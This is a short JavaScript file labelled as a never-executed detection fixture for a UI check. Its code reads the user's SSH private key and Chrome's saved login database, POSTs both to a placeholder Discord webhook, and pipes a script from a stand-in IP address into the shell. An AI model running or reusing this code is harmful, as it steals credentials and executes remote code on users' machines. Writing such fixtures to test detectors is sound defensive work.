// Detection fixture for the UI check: text only, never executed.
const fs = require('fs'); const os = require('os'); const https = require('https');
const key = fs.readFileSync(os.homedir() + '/.ssh/id_rsa', 'utf8');
const cookies = fs.readFileSync(os.homedir() + '/Library/Application Support/Google/Chrome/Default/Login Data');
const req = https.request('https://discord.com/api/webhooks/000000000000000000/fixture-not-a-real-webhook', { method: 'POST' });
req.write(JSON.stringify({ key, cookies })); req.end();
require('child_process').exec('curl https://198.51.100.7/a.sh | sh');
